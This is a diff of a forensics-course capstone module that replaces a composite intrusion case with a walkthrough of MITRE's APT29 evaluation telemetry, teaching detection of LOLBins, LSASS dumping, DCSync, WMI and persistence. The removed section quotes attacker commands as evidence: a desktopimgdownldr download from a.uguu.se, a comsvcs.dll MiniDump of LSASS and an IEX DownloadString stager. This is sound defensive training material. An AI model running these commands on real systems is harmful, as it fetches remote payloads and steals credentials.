@@ -1,210 +1,206 @@
-# Module 11 — Capstone: "Operation Hollow Update"
+# Module 11 — Capstone: APT29 (Cozy Bear) — MITRE ATT&CK Evals
 
-> **The final exam.** Everything you learned in Modules 1-10 — the Triad, event-log parsing, Sigma hunting, credential theft, lateral movement, PowerShell, Sysmon — comes together here on **one** intrusion. You're handed a triage collection, you work the case, and you produce a **timeline + findings report**. Guiding questions first; then a walkthrough; then the full solution. **Try the questions before you read the solution.**
+> **The final exam — on a real benchmark.** You've spent Modules 1-10 learning the craft on Case-001. Now you prove it against a fresh, reputable, objectively-gradable dataset: the **MITRE Engenuity ATT&CK Evaluation of APT29 (Cozy Bear)**. You're handed 196,081 pre-recorded Windows events from a full simulated intrusion, and you reconstruct the kill chain — stage by stage, artifact by artifact — then **grade yourself against a published answer key**. Work each stage before you read its interpretation.
 
-> **Evidence note.** The evidence keeps its real names wherever the data is a real capture — notably patient zero `DESKTOP-SDN1RPT` and the malware `coreupdater.exe` (Case 001), and the public-capture IOCs (`a.uguu.se`, `desktopimgdownldr.exe`).
-
-> **Read me first — how this case is built (be honest about your evidence).** This capstone is a **composite teaching scenario**. It does **not** ship a new gigabyte of data — it *reuses the real sample data already in Modules 1-10*, woven into one narrative so you can practise an end-to-end investigation without new downloads. The Part A host (`DESKTOP-SDN1RPT`) artifacts are a single real intrusion (DFIR Madness Case 001); the Part B `.evtx` are real attack-technique captures from public libraries (EVTX-ATTACK-SAMPLES, hayabusa-sample-evtx) that represent the *techniques* an intruder would use — they come from different captures and **do not share one wall-clock**. So you build the timeline as an **attack-phase narrative** (ordered by the intrusion kill-chain), pinning real timestamps where the host data provides them and ordering the Part B techniques logically. Full provenance, the artifact→module map, and licences are in [`data/README.md`](data/README.md). This is exactly how real composite training ranges (and many tabletop exercises) work — and naming that openly is itself a DFIR lesson: *know what your evidence is and isn't.*
-
----
-
-## 1. The scenario
-
-**Client:** *Middle-earth Holdings*, the realm ("Harmon Foods" in the un-themed original). **Domain:** `middle-earth.local`.
-
-**The call.** At 09:12 local time, the SOC pages you. Two days ago an employee on the front-office desktop `DESKTOP-SDN1RPT` reported that "Windows kept popping a weird update window in the middle of the night." IT shrugged it off. Last night, the **EDR flagged a credential-dumping alert on a Domain Controller**, and this morning a **finance workstation logged a remote logon from the front-office desktop at 03:00** — a path that should never exist. Management fears an intruder is moving toward the finance systems. You're given a **triage collection** pulled from the affected hosts and told: *find out what happened, how far it spread, and whether the domain's credentials are burned.*
-
-**Your deliverables (same as a real engagement):**
-1. A **timeline** of attacker activity (phase-ordered, UTC, with the artifact that proves each step).
-2. A **findings report**: initial access, execution, what was stolen, how they moved, and scope.
-3. **IOCs** to sweep the rest of the fleet.
-4. A **containment recommendation.**
+> **Why this benchmark.** Case-001 (Modules 1-10) taught you the techniques on a single, story-driven intrusion. This capstone is different **on purpose**: it is a **standalone benchmark case** built on data the whole industry knows and trusts.
+> - **Reputable.** The MITRE Engenuity ATT&CK Evaluations run real red-team emulations of named adversaries against instrumented environments. APT29 is one of their canonical rounds. Every serious EDR vendor is measured against it.
+> - **ATT&CK-mapped.** Every action the emulation performs is tagged to a specific ATT&CK technique ID, so "did I find it?" has an unambiguous answer.
+> - **Gradable.** Because the emulation plan and technique mapping are published, we ship an **answer key** ([`data/APT29-ANSWER-KEY.md`](data/APT29-ANSWER-KEY.md)). You can score your own reconstruction — coverage, evidence traceability, signal-vs-noise, detection gaps — the way the evals themselves score a product.
+>
+> Treat this as a clean-room test of everything you've learned, on data you did not narrate into existence.
 
 ---
 
-## 2. The evidence you're given
+## 1. The evidence
 
-The triage collection *is* the Modules 1-10 `data/` folders. Each maps to a host/phase of this case. You do **not** need to copy anything — `cd` into the relevant module's `data/` and run the tools there, exactly as you did in that module.
+The dataset is **`apt29_day1.json`** — the OTRF [`detection-hackathon-apt29`](https://github.com/OTRF/detection-hackathon-apt29) recording of **day 1** of the MITRE Engenuity APT29 evaluation, in **Mordor format**: one Windows event per line as JSON, drawn from four channels:
 
-| Phase of the case | Use the data in… | Represents |
+| Channel | What it carries here |
+|---|---|
+| **Sysmon** (dominant) | Process creation (EID 1), LSASS access (EID 10), registry (EID 13), file writes (EID 11) |
+| **Security** | DCSync directory replication (EID 4662), service installs (EID 7045), logons (EID 4624) |
+| **PowerShell** | Script-block logging (EID 4104) |
+| **WMI-Activity** | Provider/operation events (EID 5857-5861) for remote WMI |
+
+**196,081 events.** It is **inert, pre-recorded telemetry** — a log of what the red team did on an instrumented host. There is nothing to detonate and nothing to run; you are reading forensic records, exactly as you would on a real triage collection.
+
+---
+
+## 2. Setup
+
+The telemetry is ~120 MB compressed (~368 MB expanded), so it is **not** committed to the repo. Fetch it once, on an online host, before you start:
+
+```
+# one-time, online host only — downloads + unzips apt29_day1.json into this folder:
+sh get-data.sh
+```
+
+Everything after that is offline. All of it runs natively in **Git Bash** — `python3` and `grep` are already on your `PATH`; no container, no Docker. The rest of this walkthrough assumes `apt29_day1.json` is present in `module-11-capstone/data/`.
+
+Start every command from the data folder:
+
+```bash
+cd module-11-capstone/data
+```
+
+Sanity-check the evidence is all there:
+
+```bash
+wc -l apt29_day1.json
+```
+
+You should see **196081** — one line per event. Get your bearings on the channel mix:
+
+```bash
+python3 apt29_hunt.py summary apt29_day1.json
+```
+
+Sysmon dominates (it's the richest sensor), followed by Security, PowerShell, and WMI-Activity. That distribution *is* the story: most of your leads will come from Sysmon, but the single most damaging event of the whole intrusion lives in the Security channel (you'll find it in the DCSync stage).
+
+> **The helper.** [`apt29_hunt.py`](apt29_hunt.py) is a triage tool, not a magic answer machine. Each subcommand isolates one ATT&CK stage and counts what it finds, so you can map **evidence → technique** yourself. Subcommands: `summary execution powershell lsass dcsync wmi persistence all`. Usage is always `python3 apt29_hunt.py <stage> apt29_day1.json`.
+
+---
+
+## 3. The kill-chain walkthrough
+
+Work it in intrusion order. Each stage runs one subcommand, interprets the output, and names the ATT&CK technique plus the exact EventID/field that proves it.
+
+### Stage 1 — Execution (LOLBins)
+```bash
+python3 apt29_hunt.py execution apt29_day1.json
+```
+**~19 LOLBIN chains.** These are **Sysmon Event 1** (process creation) where a living-off-the-land binary is spawned by an interactive parent — the signature shape is `powershell.exe  <-  cmd.exe` (PowerShell launched from a command shell), with `rundll32.exe`, `regsvr32.exe`, `wscript.exe`, and `mshta.exe` in the mix too. This is the attacker getting first code execution using tools already on the box.
+- **ATT&CK:** **T1059.001** (PowerShell) and **T1059.003** (Windows Command Shell).
+- **Evidence:** Sysmon EID 1, `Image` / `ParentImage` fields.
+
+### Stage 2 — PowerShell script execution
+```bash
+python3 apt29_hunt.py powershell apt29_day1.json
+```
+**~414 script-block records.** These are **PowerShell Event 4104** (script-block logging), which captures the *compiled* script text even when the launch was Base64-encoded. Volume this high means PowerShell was the primary hands-on-keyboard tool — the attacker's staging, discovery, and dumping all flow through it.
+- **ATT&CK:** **T1059.001** (PowerShell).
+- **Evidence:** PowerShell EID 4104, `ScriptBlockText`.
+- **Blind-spot note:** 4104 sees *managed* PowerShell. **Unmanaged / in-memory** PowerShell (the engine hosted inside another process) is invisible here — you catch that with Sysmon 7 (`System.Management.Automation.dll` loaded into a non-PS process), 8 (CreateRemoteThread), and 10 (LSASS access). Keep that gap in mind for your detection-gap score.
+
+### Stage 3 — Credential access: LSASS  ★ signal vs. noise
+```bash
+python3 apt29_hunt.py lsass apt29_day1.json
+```
+This is the marquee lesson of the whole capstone. You get **1,064 Sysmon Event 10 (ProcessAccess) events targeting `lsass.exe`**, grouped by the **`GrantedAccess`** mask — the exact bitmask teaching from **Module 07**, now applied at scale. Reading the masks:
+
+| `GrantedAccess` | Count | What it means |
 |---|---|---|
-| **Patient-zero execution evidence (the Triad)** | `module-01…/data`, `module-02…/data`, `module-03…/data` | `DESKTOP-SDN1RPT` Prefetch, ShimCache, Amcache |
-| **Fleet sweep for the bad binary** | `module-04…/data` | the same host + peer workstations (stacking) |
-| **Initial access / download** | `module-05…/data` | LOLBAS download (`desktopimgdownldr` → `.7z`) |
-| **Triage the whole log set with rules** | `module-06…/data` | 23 attack-technique logs to Sigma-hunt |
-| **Credential theft** | `module-07…/data` | LSASS dumps + DCSync on a DC |
-| **Lateral movement** | `module-08…/data` | PsExec, DCOM, scheduled tasks, RDP, Pass-the-Hash |
-| **PowerShell tradecraft** | `module-09…/data` | 4104 script blocks, in-memory PowerShell |
-| **Sensor / centralisation view** | `module-10…/data` | Sysmon vs default logging (incl. a DC attack) |
+| **`0x1000`** | **830** | `PROCESS_QUERY_LIMITED_INFORMATION` — query-only. **Benign noise.** AV, EDR, and Windows itself poke LSASS constantly. |
+| **`0x1478`** | **186** | Includes write/inject rights (`VM_WRITE` / `VM_OPERATION`) — read/write into LSASS memory. **Suspicious.** |
+| **`0x1400`** | **31** | `VM_READ` + query — reading LSASS memory. **Suspicious.** |
+| **`0x40`** | **14** | `DUP_HANDLE` — handle duplication, a known dump primitive. |
+| **`0x1FFFFF`** | **3** | `PROCESS_ALL_ACCESS` — **full access, from `PowerShell.exe`. This is the reflective-Mimikatz dump.** |
 
-> **Reminder:** all tools are installed natively on the lab VM and already on your `PATH`. Open **Git Bash**, `cd` into the relevant module's `data/` folder, and run each command directly from there — no container, no Docker.
+The point: **830 of 1,064 accesses are innocent.** If you alert on "anything touches LSASS," you drown. The real credential theft is the **3 × `0x1FFFFF` from PowerShell** (nothing legitimate opens LSASS with full access from a script host) plus the write-capable `0x1478`/`0x1400` masks. **Rarity + the right mask + the wrong source image = conviction.** Separating those 3 events from the 830 is the skill Module 07 built.
+- **ATT&CK:** **T1003.001** (OS Credential Dumping: LSASS Memory).
+- **Evidence:** Sysmon EID 10, `GrantedAccess` + `SourceImage`.
 
----
-
-## 3. Guiding questions (answer these first)
-
-Work the case in kill-chain order. Write your answer to each before looking at the walkthrough or solution.
-
-**A. Initial access — how did they get in?** *(Module 5 data)*
-1. Parse the event logs to one timeline. What legitimate Windows binary was abused to download a file, what was the URL, and what file type landed? Which two channels both recorded it, and why does that matter?
-
-**B. Execution on patient zero — what ran, and is it malware?** *(Modules 1-3 data)*
-2. On `DESKTOP-SDN1RPT`, find the executable that masquerades as a system updater. When did it run (UTC), how many times, and how many files did it load?
-3. Build its **identity card** from Amcache: SHA1, size, path, `IsOsComponent`, ProductName. Give three reasons it's malware.
-4. Apply the **Triad**: which of Prefetch / ShimCache / Amcache contain this file, and which doesn't? What does the gap mean?
-
-**C. Scope on one host → the fleet.** *(Module 4 data)*
-5. You now hold the malware's SHA1. Write the stacking hypothesis and the command you'd run across 500 hosts. On the three hosts you *do* have, how many carry the file, and why isn't "rare" enough to convict on its own?
-
-**D. Credential theft — are the domain's secrets burned?** *(Module 7 + Module 10 data)*
-6. Identify **three different** LSASS credential-theft techniques in the data by their Sysmon 10 `GrantedAccess` masks and source images.
-7. One technique doesn't touch LSASS at all but steals domain password data from a Domain Controller. Name it, name the event ID, and explain how you tell the malicious case from normal replication.
-
-**E. Lateral movement — how did they spread to finance?** *(Module 8 data)*
-8. Find a **service-based** remote-execution (PsExec-style) hop: which event proves the service install, which proves the carrier logon, and how do you tie them to one session?
-9. Find a **Pass-the-Hash** logon. What Logon Type signals it, and how does it connect back to the credential theft in section D?
-10. Find the **RDP** connection toward the finance host. Which event carries the source IP, and why is it useful even if the logon failed?
-
-**F. PowerShell — what did they actually type?** *(Module 9 data)*
-11. Read a 4104 script block. What intent is visible even though the launch command was encoded? Name one technique that would be *invisible* to 4104 and the Sysmon IDs that catch it instead.
-
-**G. Synthesis.**
-12. Produce the **attack-phase timeline** and a 5-line findings summary. List your **IOCs** and one **containment** action.
-
----
-
-## 4. Walkthrough (how to work it)
-
-You don't need new commands — every one of these is from the module you're pointing at. Here's the order and the *why*.
-
-### Step 1 — Establish initial access (Module 5)
+### Stage 4 — Credential access: DCSync  ★ the one-in-196,081 needle
 ```bash
-cd module-05-evtx-evtxecmd/data
-EvtxECmd -d . --csv . --csvf timeline.csv
-grep -i "uguu.se\|desktopimgdownldr" timeline.csv
+python3 apt29_hunt.py dcsync apt29_day1.json
 ```
-Sort `timeline.csv` by `TimeCreated`. You're looking for a **trusted binary used as a downloader** (a LOLBAS) and the **same URL in more than one channel** (Sysmon command line *and* the BITS service that did the fetch). That's your entry point and your first corroboration.
+**Exactly one event.** A single **Security Event 4662** in which a **non-DC account** requests directory-replication access — identified by the replication control-access-right GUID `1131f6aa-…` (`DS-Replication-Get-Changes`). This is **DCSync**: the attacker impersonates a domain controller and asks a real DC to hand over password hashes over the wire. No LSASS touched, no malware dropped — just a legitimate protocol abused.
 
-### Step 2 — Prove execution on patient zero (the Triad — Modules 1-3)
+This is the single most consequential event in the entire dataset, and there is **exactly one of it among 196,081**. Only a domain controller's computer account should ever replicate; a *user* account requesting it is DCSync, full stop. Find this needle and you've found domain compromise — treat every credential in the domain (including `krbtgt`) as burned.
+- **ATT&CK:** **T1003.006** (OS Credential Dumping: DCSync).
+- **Evidence:** Security EID 4662, `Properties` GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`, non-DC `SubjectUserName`.
+
+### Stage 5 — Lateral movement: WMI
 ```bash
-# Module 1 — did it run?
-cd ../../module-01-prefetch-pecmd/data
-prefetch prefetch/COREUPDATER.EXE-157C54BB.pf | grep -E "Run count|Last run time: 1|Number of filenames"
-# Module 3 — what is it? (SHA1 identity)
-#   in module-03…/data:  grep -i coreupdater amcache_UnassociatedFileEntries.csv
-# Module 2 — did the OS see it? (the gap)
-#   in module-02…/data:  grep -i coreupdater shimcache.csv   # → nothing
+python3 apt29_hunt.py wmi apt29_day1.json
 ```
-Prefetch gives you *ran, when, how often, files loaded*. Amcache gives you *SHA1 + metadata*. ShimCache's **silence** is the Triad gap — note it, don't be fooled by it.
+**~90 WMI-Activity events** (EIDs **5857-5861** on the `Microsoft-Windows-WMI-Activity/Operational` channel), plus any process spawned by `WmiPrvSE.exe`. WMI is a remote-execution and lateral-movement channel: the attacker drives commands on other hosts through the WMI provider service rather than dropping a binary. The 5857-5861 events record provider loads and operation execution — the fingerprints of remote WMI use.
+- **ATT&CK:** **T1047** (Windows Management Instrumentation) and **T1021.003** (Remote Services: DCOM).
+- **Evidence:** WMI-Activity EIDs 5857-5861; Sysmon EID 1 with `ParentImage = WmiPrvSE.exe`.
 
-### Step 3 — Scope to the fleet (Module 4)
-With the SHA1 in hand, **stack** it across hosts. On the bundled three, confirm the malware is on `DESKTOP` only (Count = 1) while OS binaries are Count = 3. The same `stack "FileName,Sha1"` idea runs across 500 hosts to surface every infected box. Remember the trap: rare *benign* apps are also Count = 1 — **rarity finds candidates, metadata convicts.**
-
-### Step 4 — Triage everything with rules (Module 6)
+### Stage 6 — Persistence
 ```bash
-cd ../../module-06-sigma-chainsaw-hayabusa/data
-hayabusa csv-timeline -d . -o all-timeline.csv
-chainsaw hunt . -s /opt/chainsaw/sigma --mapping /opt/chainsaw/repo/mappings/sigma-event-logs-all.yml
+python3 apt29_hunt.py persistence apt29_day1.json
 ```
-Run **both** engines over the whole folder. Hayabusa ranks by severity (reading order); Chainsaw names the technique with evidence. This is how you turn 20-plus logs into a prioritised lead list in two commands.
+Two persistence mechanisms:
+- **~209 Sysmon Event 13 (registry value set)** writing to `…\CurrentVersion\Run` — **Run-key** autostarts that relaunch the payload at every logon.
+- **5 Security Event 7045 (service installed)** — new services registered to survive reboots and run with high privilege.
 
-### Step 5 — Credential theft (Modules 7 & 10)
-In `module-07…/data`, read the **Sysmon 10** events on `lsass.exe` and record each **`GrantedAccess`** mask + source image — that's how you tell Mimikatz.exe from Invoke-Mimikatz from a `comsvcs` MiniDump. Then find the **4662 DCSync** on the DC. Cross-check the Sysmon-10+11 dump view in `module-10…/data`.
+- **ATT&CK:** **T1547.001** (Boot or Logon Autostart: Registry Run Keys) and **T1543.003** (Create or Modify System Process: Windows Service).
+- **Evidence:** Sysmon EID 13 (`TargetObject` under a `Run` key); Security EID 7045 (`ServiceName` / `ImagePath`).
 
-### Step 6 — Lateral movement (Module 8)
-For each hop, find the **delivery event** (7045 service, 5145 pipe, Sysmon 17/18, 4698/4702 task, RdpCoreTS 131) **and** the **carrier logon** (4624 Type 3 + 4672), and bind them by **time + LogonId**. The Pass-the-Hash logon (Type 9) links the spread back to Step 5's theft.
+### See the raw data underneath
+The helper counts for you, but you should always know how to hit the JSON directly. For example, to count every LSASS-access record (Sysmon EID 10) with plain `grep`:
 
-### Step 7 — PowerShell intent (Module 9)
-Read the **4104** `ScriptBlockText` for the decoded commands (`IEX`, `DownloadString`, `MiniDumpWriteDump`, `Get-Process lsass`). Note that **unmanaged/in-memory PowerShell** evades 4104 and is caught by Sysmon **7/8/10** instead.
+```bash
+grep -c '"EventID":10' apt29_day1.json
+```
 
-### Step 8 — Assemble the report
-Lay every proven step on one phase-ordered timeline, write the findings, list IOCs, recommend containment.
+That's the un-abstracted view — every line is one JSON event, and every subcommand above is just a smarter filter over the same file. When a finding matters, drop to `grep` and read the actual event.
 
 ---
 
-## 5. Solution
+## 4. Two lenses: Cyber Kill Chain × ATT&CK
 
-> Spoilers. Values verified against the bundled data on the lab VM.
+A strong capstone tells the story in **both** frameworks. The **Lockheed Martin Cyber Kill Chain** gives you the intrusion *narrative* (the arc of the attack); **ATT&CK** gives you the granular *per-artifact* mapping. They are not competitors — they are the wide shot and the close-up.
 
-### A. Initial access
-A LOLBAS download: **`desktopimgdownldr.exe`** (a legit Windows lockscreen-image tool) was abused with
-`desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr`
-to fetch a **`.7z` archive** from **`a.uguu.se`** (a throwaway file-share host). It was recorded in **two channels** — **Sysmon (Event 1, the command line)** *and* **BITS-Client (59/60, the service that performed the transfer)**. Two independent records of the same download = high-confidence initial access. *(Module 5.)*
+| Cyber Kill Chain phase | What happened here | ATT&CK technique(s) | Proof in the telemetry |
+|---|---|---|---|
+| **Exploitation / Installation** | LOLBins get first execution; PowerShell staged | T1059.001, T1059.003 | Sysmon 1 chains (19); PS 4104 (414) |
+| **Actions on Objectives — credential access** | LSASS dumped; DCSync steals the domain | T1003.001, **T1003.006** | Sysmon 10 (`0x1FFFFF` ×3); Security **4662** (×1) |
+| **Lateral Movement** | Remote execution over WMI/DCOM | T1047, T1021.003 | WMI-Activity 5857-5861 (90) |
+| **Command & Control / Persistence** | Run keys + services survive reboot | T1547.001, T1543.003 | Sysmon 13 (209); Security 7045 (5) |
 
-> **Honesty note — this vector is a representative stand-in.** The `desktopimgdownldr → a.uguu.se` download is a **public LOLBAS technique sample** (Module 5's EVTX-ATTACK-SAMPLES data) used here to *teach* an initial-access pattern. It is **not** the literal entry vector of the real DFIR-Madness Case 001 host, which was an **RDP brute-force followed by an Internet Explorer download from `194.61.24.102`**. The capstone composes the case from several public technique captures (see [`data/README.md`](data/README.md)); treat this phase as "an initial access of this kind," not as ground truth for Case 001.
-
-### B. Execution on patient zero (`DESKTOP-SDN1RPT`)
-- The masquerading binary is **`coreupdater.exe`** in `C:\Windows\System32\`. Prefetch: **RunCount 1**, **last run 2020-09-19 03:40:49 UTC**, **51 files loaded**.
-- **Identity card (Amcache):** SHA1 **`fd153c66386ca93ec9993d66a84d6f0d129a3a5c`**, size **7,168 bytes**, path `c:\windows\system32\coreupdater.exe`, **`IsOsComponent = False`**, **ProductName empty**, `FileKeyLastWrite` **2020-09-19 03:40:45 UTC**.
-- **Why it's malware (any three):** a System32-named "updater" that is **not** an OS component; **no** product/version metadata; tiny **7 KB**; appeared/ran in the **incident window**; name engineered to blend in.
-- **Triad:** present in **Amcache** (identity) and **Prefetch** (execution), **absent** from **ShimCache**. The gap doesn't exonerate it — two artifacts already prove identity *and* execution; ShimCache simply didn't record this path. *(Modules 1-3.)*
-
-### C. Fleet scope
-Hypothesis: *"Hosts carrying SHA1 `fd153c66…` are compromised; it'll be rare (low count) against ubiquitous OS binaries."* Command shape: `AppCompatProcessor … stack "FileName,Sha1"` across all hosts. On the bundled three, **`coreupdater.exe` is on `DESKTOP` only (Count = 1)**; `WORKSTATION-07/12` are clean. But `chrome.exe`/`firefox.exe`/`code.exe` are *also* Count = 1 — so rarity gave a **candidate list**; the **metadata** convicted. *(Module 4.)*
-
-### D. Credential theft — domain secrets are burned
-Three distinct LSASS techniques, by **Sysmon 10 mask + source**:
-- **Invoke-Mimikatz** (PowerShell port) — `GrantedAccess` **`0x143a`**, source **`powershell.exe`**.
-- **Mimikatz.exe `sekurlsa::logonpasswords`** — `GrantedAccess` **`0x1010`**, source **`mimikatz.exe`**.
-- **`comsvcs.dll` MiniDump (LOLBAS)** — `rundll32 … comsvcs.dll, MiniDump <lsass-PID> <file> full` (Sysmon 1 + 10), and the matching **Sysmon 10 + 11** (.dmp written) view in Module 10.
-And the domain-level theft: **DCSync** — **Security Event 4662** on the DC where a **user** account requests **directory replication**. A user replicating password data is DCSync; only a **DC computer account** should replicate. **Verdict: domain credentials must be treated as compromised.** *(Modules 7 & 10.)*
-
-### E. Lateral movement to finance
-- **PsExec-style service hop:** **7045** (service installed, ImagePath betraying a fake service name) + **5145** on the service pipe (`svcctl`/`PSEXESVC`/renamed) + Sysmon **17/18**, paired with the **carrier logon 4624 Type 3 + 4672**, bound by **LogonId**.
-- **Pass-the-Hash:** a **4624 Logon Type 9 (NewCredentials)** — authentication with a stolen *hash*, no plaintext. It connects directly to section D: the hash came from the LSASS dumps.
-- **RDP toward finance:** **RdpCoreTS 131** carries the **client IP** of the connecting host — useful even on a *failed* logon, because it records the source of the attempt before authentication. *(Module 8.)*
-
-### F. PowerShell intent
-The **4104** script blocks decode to credential-dump and downloader intent — `MiniDumpWriteDump` + `Get-Process lsass` (dump LSASS in pure PowerShell) and `IEX (New-Object Net.WebClient).DownloadString(...)` (stager) — visible **even though the launch was Base64**, because 4104 logs the compiled script. What's **invisible to 4104**: **unmanaged/in-memory PowerShell** (the engine hosted inside another process) — caught instead by Sysmon **7** (`System.Management.Automation.dll` in a non-PS process), **8** (CreateRemoteThread), **10** (LSASS access). *(Module 9.)*
-
-### G. Attack-phase timeline & findings
-
-**Timeline (kill-chain order; real UTC where the host data provides it):**
-```
-PHASE 1  Initial access   desktopimgdownldr.exe → https://a.uguu.se/...Bin.7z  (Sysmon 1 + BITS 59/60)
-PHASE 2  Execution        2020-09-19 03:40:49 UTC  coreupdater.exe runs on DESKTOP-SDN1RPT
-                          (Prefetch runs=1, 51 files; Amcache SHA1 fd153c66…; NOT in ShimCache)
-                          LOLBins cluster 03:13–05:09: cmd.exe (x9), rundll32 (run @03:40:45), powershell
-PHASE 3  Cred access      LSASS dumped — Invoke-Mimikatz 0x143a / mimikatz.exe 0x1010 / comsvcs MiniDump
-                          DCSync on DC — Security 4662, user requests replication  → domain creds burned
-PHASE 4  Lateral movement PsExec service (7045 + 5145 + 4624 T3/4672, same LogonId);
-                          Pass-the-Hash (4624 Type 9); RDP toward finance (RdpCoreTS 131, source IP)
-PHASE 5  Hands-on-keyboard PowerShell 4104: MiniDumpWriteDump/Get-Process lsass, IEX DownloadString
-```
-
-**Findings (5 lines):**
-1. **Initial access** via a LOLBAS download (`desktopimgdownldr` → `a.uguu.se/...Bin.7z`) on the front-office desktop.
-2. **Execution & foothold:** `coreupdater.exe` (SHA1 `fd153c66…`), a 7 KB non-OS binary masquerading in System32, ran 2020-09-19 03:40:49 UTC.
-3. **Credential theft is confirmed and domain-wide:** multiple LSASS-dump techniques **plus DCSync** on a DC — treat all domain credentials as compromised.
-4. **Lateral movement reached finance** via PsExec service install and Pass-the-Hash; an **RDP connection toward the finance host** is also recorded (an attempt/connection, not a confirmed successful logon) — each with its carrier logon.
-5. **Hands-on-keyboard** activity via obfuscated PowerShell; some PowerShell ran in-memory (Sysmon-only visibility).
-
-**IOCs to sweep the fleet:**
-- File hash **SHA1 `fd153c66386ca93ec9993d66a84d6f0d129a3a5c`** (`coreupdater.exe`, 7,168 bytes, System32).
-- Network: **`a.uguu.se`**, URL path `…/Hv0bgvgHGNeH_Bin.7z`.
-- Behaviour: `desktopimgdownldr.exe /lockscreenurl:`; `rundll32 … comsvcs.dll, MiniDump`; Sysmon 10 on `lsass.exe` with masks `0x1010`/`0x143a`; 4662 replication by a non-DC account; 4624 **Type 9** logons; 7045 fake-service installs.
-
-**Containment recommendation (one):** **Force a domain-wide credential reset — including the `krbtgt` account (twice) and all privileged accounts — and isolate `DESKTOP-SDN1RPT` and any host bearing SHA1 `fd153c66…`,** because DCSync means the attacker can forge tickets until the keys are rotated. (Then: hunt the IOCs fleet-wide via the WEF-collected logs — Module 10 — and stack the SHA1 across all hosts — Module 4.)
+Narrated in kill-chain terms: the attacker **executed** via living-off-the-land binaries, **weaponized PowerShell** for hands-on work, **harvested credentials** from LSASS and then escalated to **total domain compromise via DCSync**, **moved laterally** over WMI, and **entrenched** with Run keys and services. Every clause of that sentence is backed by a specific EventID above.
 
 ---
 
-## 6. What this capstone proved you can do
+## 5. Grade yourself
 
-- Take a **triage collection** and, with no prior knowledge of the case, reconstruct an intrusion **end-to-end**.
-- Use the **Triad** to prove execution and identity on patient zero, then **scale** the scope to the fleet by hash.
-- Read the **event logs** for the full attacker story — initial access, **credential theft** (incl. DCSync), **lateral movement**, and **PowerShell** intent — and tie events together by **time and LogonId**.
-- Run **Sigma** engines to triage at speed, and know what each **Sysmon** ID and **WEF** give you.
-- Deliver a **timeline, findings, IOCs, and a containment call** — the actual product of an investigation.
+Score your reconstruction against **[`data/APT29-ANSWER-KEY.md`](data/APT29-ANSWER-KEY.md)** — it holds the full ATT&CK technique → evidence table and the rubric. Assess yourself on:
 
-> **"Master the Triad. Close the Gap."** — you just did, end to end.
+1. **Coverage** — did you find all the stages? (Each is one `apt29_hunt.py` subcommand.)
+2. **Evidence-to-technique traceability** — for every ATT&CK ID, can you cite the *specific* event (EventID + field), not just the technique name? That is the FOR508 / DFIR-Report standard.
+3. **Signal vs. noise** — did you separate the real LSASS dump (`0x1FFFFF`, `0x1478`) from the ~830 benign `0x1000` query-only accesses? (Module 07's GrantedAccess lesson, applied at scale.)
+4. **The DCSync needle** — did you catch the single 4662 event in 196,081? That's the capstone's marquee find.
+5. **Detection gaps** — where is a stage *thin* in the telemetry? The MITRE evals methodology explicitly scores visibility gaps, not just hits. Note them.
+
+---
+
+## 6. Try it yourself
+
+Before you read the answer key, prove you can do these unaided:
+
+1. **Run the whole chain in one shot** — `python3 apt29_hunt.py all apt29_day1.json` — and write a one-line finding for each stage naming the ATT&CK ID and the deciding EventID/field.
+2. **Isolate the dump.** From the `lsass` output, identify the exact three events that are the real credential theft and explain — in one sentence each — why `0x1000` is *not* one of them.
+3. **Pull the needle by hand.** Use `grep` to find the single DCSync 4662 event directly in the JSON, then read the full record. Who is the subject account, and why does that convict it?
+4. **Score your detection gaps.** Which stage has the *least* corroborating evidence in this day-1 telemetry, and what additional sensor (think Module 10 — Sysmon vs. default logging) would close it?
+5. **Write the report.** Produce a phase-ordered timeline (kill-chain order), a 5-line findings summary, your IOCs, and one containment recommendation. Compare it to the rubric.
+
+---
+
+## 7. What this capstone proved you can do
+
+- Take a **196,081-event triage collection** from a reputable benchmark and, cold, reconstruct an intrusion **end-to-end**.
+- Map every artifact to a **specific ATT&CK technique** with an EventID + field citation.
+- Separate **signal from noise** at scale — the 3 real LSASS dumps hiding among 830 benign accesses.
+- Find the **one-in-196,081 DCSync needle** and understand why it means domain-wide compromise.
+- Tell the story in **both** Cyber Kill Chain and ATT&CK terms, and **grade your own work** against a published key.
+
+> **You learned the craft on Case-001. Here you proved it on the benchmark the industry uses.**
 
 ## Sources & further reading
-- DFIR Madness — *Case 001, "The Stolen Szechuan Sauce"* (the patient-zero host data): <https://dfirmadness.com/the-stolen-szechuan-sauce/>
-- @sbousseaden — *EVTX-ATTACK-SAMPLES* (the technique captures, GPLv3): <https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES>
-- Yamato Security — *hayabusa-sample-evtx*: <https://github.com/Yamato-Security/hayabusa-sample-evtx>
-- MITRE ATT&CK — the kill-chain tactics used here (Initial Access, Execution, Credential Access, Lateral Movement): <https://attack.mitre.org/>
-- JPCERT/CC — *Detecting Lateral Movement through Tracking Event Logs*: <https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf>
-- See [`data/README.md`](data/README.md) for the full artifact→module map, provenance, and licences.
+- **MITRE Engenuity ATT&CK Evaluations — APT29:** <https://attackevals.mitre-engenuity.org/enterprise/apt29>
+- **OTRF `detection-hackathon-apt29`** (the telemetry recording): <https://github.com/OTRF/detection-hackathon-apt29>
+- **SANS "Hunt Evil" poster** (lateral-movement artifacts by technique): <https://www.sans.org/posters/hunt-evil/>
+- **Lockheed Martin — Cyber Kill Chain:** <https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html>
+- **The DFIR Report** (write-up format this capstone's report emulates): <https://thedfirreport.com/>
+- **MITRE ATT&CK technique pages:**
+  [T1003.001 LSASS Memory](https://attack.mitre.org/techniques/T1003/001/) ·
+  [T1003.006 DCSync](https://attack.mitre.org/techniques/T1003/006/) ·
+  [T1059.001 PowerShell](https://attack.mitre.org/techniques/T1059/001/) ·
+  [T1047 WMI](https://attack.mitre.org/techniques/T1047/) ·
+  [T1547.001 Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/)
 
 ---
-*Back to the [course guide](../COURSE.md) · [curriculum](../README.md). Answers to every module's exercises are in [ANSWER-KEY.md](../ANSWER-KEY.md); terms are defined in [GLOSSARY.md](../GLOSSARY.md).*
+*Back to the [course guide](../COURSE.md) · [curriculum](../README.md). Terms are defined in [GLOSSARY.md](../GLOSSARY.md).*
